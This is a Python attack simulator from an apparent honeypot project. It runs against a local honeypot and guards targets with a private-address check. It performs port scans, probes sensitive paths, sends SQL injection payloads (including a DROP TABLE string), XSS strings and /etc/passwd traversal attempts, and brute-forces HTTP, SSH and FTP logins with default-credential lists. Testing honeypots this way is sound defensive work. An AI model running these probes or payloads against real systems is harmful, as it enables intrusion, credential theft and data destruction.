import os
import sys
# Allow running this script directly by ensuring project root is on sys.path
_PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

import socket
import time
import requests
import argparse
from honeypot.config import HTTP_PORT, SSH_PORT, FTP_PORT, ALLOWED_ATTACK_TARGETS
from honeypot.utils.helpers import is_private_or_local

# Safety: require an explicit --target when not using default and check it's private/local
DEFAULT_TARGET = "127.0.0.1"

def check_target_safety(target):
    if target in ALLOWED_ATTACK_TARGETS:
        return True
    return is_private_or_local(target)

def simple_port_scan(target, ports=(21, 22, 80, 2121, 2222, 8080, 3306), timeout=0.8):
    results = {}
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((target, p))
            results[p] = "OPEN"
            s.close()
        except Exception:
            results[p] = "CLOSED"
    return results

def http_probe(target, port=HTTP_PORT):
    paths = ["/", "/admin", "/login", "/wp-admin", "/.env", "/robots.txt", 
             "/phpmyadmin", "/administrator", "/config.php", "/wp-config.php",
             "/backup", "/test", "/api", "/dashboard", "/panel"]
    results = []
    for p in paths:
        url = f"http://{target}:{port}{p}"
        try:
            r = requests.get(url, timeout=3)
            results.append((url, r.status_code, len(r.content)))
        except Exception as e:
            results.append((url, "ERR", str(e)))
        time.sleep(0.2)
    return results

def sql_injection_probe(target, port=HTTP_PORT):
    """Simulate SQL injection attempts"""
    payloads = [
        "' OR '1'='1",
        "1' UNION SELECT * FROM users--",
        "'; DROP TABLE users;--",
        "1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--",
        "admin'/*",
    ]
    results = []
    paths = ["/login", "/search", "/user"]
    
    for path in paths:
        for payload in payloads:
            url = f"http://{target}:{port}{path}"
            data = {"username": payload, "password": "test"}
            try:
                r = requests.post(url, data=data, timeout=3)
                results.append((f"POST {path}", payload, r.status_code))
            except Exception as e:
                results.append((f"POST {path}", payload, f"ERR: {str(e)}"))
            time.sleep(0.3)
    return results

def xss_probe(target, port=HTTP_PORT):
    """Simulate XSS attempts"""
    payloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "';alert('XSS');//",
    ]
    results = []
    paths = ["/search", "/comment", "/feedback"]
    
    for path in paths:
        for payload in payloads:
            url = f"http://{target}:{port}{path}?q={payload}"
            try:
                r = requests.get(url, timeout=3)
                results.append((f"GET {path}", payload, r.status_code))
            except Exception as e:
                results.append((f"GET {path}", payload, f"ERR: {str(e)}"))
            time.sleep(0.2)
    return results

def brute_force_simulation(target, port=HTTP_PORT):
    """Simulate brute force login attempts"""
    credentials = [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("root", "root"), ("root", "toor"), ("user", "user"),
        ("test", "test"), ("guest", "guest"), ("administrator", "admin")
    ]
    results = []
    
    for username, password in credentials:
        url = f"http://{target}:{port}/login"
        data = {"username": username, "password": password}
        try:
            r = requests.post(url, data=data, timeout=3)
            results.append((username, password, r.status_code))
        except Exception as e:
            results.append((username, password, f"ERR: {str(e)}"))
        time.sleep(0.5)
    return results

def directory_traversal_probe(target, port=HTTP_PORT):
    """Simulate directory traversal attempts"""
    payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd"
    ]
    results = []
    
    for payload in payloads:
        url = f"http://{target}:{port}/file?path={payload}"
        try:
            r = requests.get(url, timeout=3)
            results.append((payload, r.status_code))
        except Exception as e:
            results.append((payload, f"ERR: {str(e)}"))
        time.sleep(0.3)
    return results

def ssh_simulate_text(target, port=SSH_PORT, attempts=4):
    results = []
    for _ in range(attempts):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            banner = s.recv(2048)
            # send plain-text lines to the fake ssh port (harmless)
            creds = [b"root:toor\n", b"admin:admin\n", b"user:password\n"]
            for c in creds:
                try:
                    s.sendall(c)
                    time.sleep(0.2)
                except Exception:
                    break
            s.close()
            results.append(("OK", banner.decode(errors="replace").strip()))
        except Exception as e:
            results.append(("ERR", str(e)))
        time.sleep(0.3)
    return results

def enhanced_ssh_brute_force(target, port=SSH_PORT):
    """Enhanced SSH brute force simulation with common credentials"""
    credentials = [
        ("root", "root"), ("root", "toor"), ("root", "password"),
        ("root", "123456"), ("root", "admin"), ("root", ""),
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("user", "user"), ("user", "password"), ("guest", "guest"),
        ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("postgres", "postgres"),
        ("mysql", "mysql"), ("oracle", "oracle"), ("test", "test")
    ]
    results = []
    
    for username, password in credentials:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            banner = s.recv(1024)
            
            # Simulate SSH protocol negotiation attempts
            ssh_version = b"SSH-2.0-OpenSSH_8.0\r\n"
            s.sendall(ssh_version)
            
            # Send credential attempt as plain text (honeypot won't parse properly)
            cred_attempt = f"{username}:{password}\n".encode()
            s.sendall(cred_attempt)
            
            # Try to receive response
            try:
                response = s.recv(1024)
                results.append((username, password, "attempted", len(response)))
            except:
                results.append((username, password, "no_response", 0))
            
            s.close()
        except Exception as e:
            results.append((username, password, "connection_failed", str(e)))
        
        time.sleep(0.4)  # Realistic delay between attempts
    
    return results

def malware_simulation(target, port=HTTP_PORT):
    """Simulate malware-like HTTP requests"""
    malware_paths = [
        "/shell.php", "/c99.php", "/r57.php", "/webshell.php",
        "/cmd.php", "/backdoor.php", "/upload.php", "/file.php",
        "/eval.php", "/system.php", "/exec.php", "/passthru.php"
    ]
    malware_agents = [
        "Mozilla/5.0 (compatible; Baiduspider/2.0)",
        "python-requests/2.25.1", "curl/7.68.0",
        "Wget/1.20.3", "masscan/1.0.5"
    ]
    
    results = []
    for path in malware_paths:
        for agent in malware_agents[:2]:  # Limit to avoid too many requests
            url = f"http://{target}:{port}{path}"
            headers = {"User-Agent": agent}
            try:
                r = requests.get(url, headers=headers, timeout=3)
                results.append((path, agent, r.status_code))
            except Exception as e:
                results.append((path, agent, f"ERR: {str(e)}"))
            time.sleep(0.3)
    
    return results

def ftp_brute_force(target, port=FTP_PORT):
    """Simulate FTP brute force attacks"""
    credentials = [
        ("anonymous", ""), ("anonymous", "user@domain.com"),
        ("ftp", "ftp"), ("admin", "admin"), ("root", "root"),
        ("user", "user"), ("test", "test"), ("guest", "guest"),
        ("administrator", "password"), ("ftpuser", "ftpuser")
    ]
    results = []
    
    for username, password in credentials:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            
            # Receive banner
            banner = s.recv(1024)
            
            # Send USER command
            user_cmd = f"USER {username}\r\n"
            s.sendall(user_cmd.encode())
            response1 = s.recv(1024)
            
            # Send PASS command
            pass_cmd = f"PASS {password}\r\n"
            s.sendall(pass_cmd.encode())
            response2 = s.recv(1024)
            
            # Send QUIT to close connection cleanly
            s.sendall(b"QUIT\r\n")
            s.recv(1024)  # Receive goodbye message
            
            results.append((username, password, "attempted", response2.decode('utf-8', errors='replace').strip()))
            s.close()
            
        except Exception as e:
            results.append((username, password, "connection_failed", str(e)))
        
        time.sleep(0.5)  # Realistic delay
    
    return results

def main(target):
    if not check_target_safety(target):
        print("[!] Target appears public or unsafe. Aborting. Only localhost/private networks allowed.")
        return

    print("[*] Starting comprehensive attack simulation...")
    print(f"[*] Target: {target}")
    print("=" * 60)

    # 1. Port scanning
    print("[*] Phase 1: Port scanning...")
    scan = simple_port_scan(target)
    for p,st in scan.items():
        print(f"  port {p}: {st}")
    print()

    # 2. Basic HTTP probes
    print("[*] Phase 2: HTTP directory enumeration...")
    for url, status, info in http_probe(target):
        print(f"  {url} -> {status}  ({info})")
    print()

    # 3. SQL Injection attempts
    print("[*] Phase 3: SQL Injection simulation...")
    for method, payload, status in sql_injection_probe(target):
        print(f"  {method} -> Payload: {payload[:30]}... -> {status}")
    print()

    # 4. XSS attempts
    print("[*] Phase 4: XSS simulation...")
    for method, payload, status in xss_probe(target):
        print(f"  {method} -> Payload: {payload[:30]}... -> {status}")
    print()

    # 5. Directory traversal
    print("[*] Phase 5: Directory traversal simulation...")
    for payload, status in directory_traversal_probe(target):
        print(f"  Path: {payload[:40]}... -> {status}")
    print()

    # 6. HTTP brute force
    print("[*] Phase 6: HTTP brute force simulation...")
    for username, password, status in brute_force_simulation(target):
        print(f"  Login attempt: {username}:{password} -> {status}")
    print()

    # 7. Malware-like requests
    print("[*] Phase 7: Malware simulation...")
    for path, agent, status in malware_simulation(target):
        print(f"  {path} with {agent[:20]}... -> {status}")
    print()

    # 8. Basic SSH interactions
    print("[*] Phase 8: SSH-like text interactions...")
    for res in ssh_simulate_text(target):
        print("  ssh_sim:", res)
    print()

    # 9. Enhanced SSH brute force
    print("[*] Phase 9: Enhanced SSH brute force...")
    for username, password, status, info in enhanced_ssh_brute_force(target):
        print(f"  SSH: {username}:{password} -> {status} ({info})")
    print()

    # 10. FTP brute force
    print("[*] Phase 10: FTP brute force simulation...")
    for username, password, status, response in ftp_brute_force(target):
        print(f"  FTP: {username}:{password} -> {status}")
    print()

    print("=" * 60)
    print("[*] Simulation complete! Check honeypot logs for captured events.")
    print("[*] Run: python -m honeypot.services.analyzer")
    print("=" * 60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Safe honeypot attack simulator (lab-only).")
    parser.add_argument("--target", "-t", default=DEFAULT_TARGET, help="Target hostname/IP (must be private/local).")
    args = parser.parse_args()
    main(args.target)
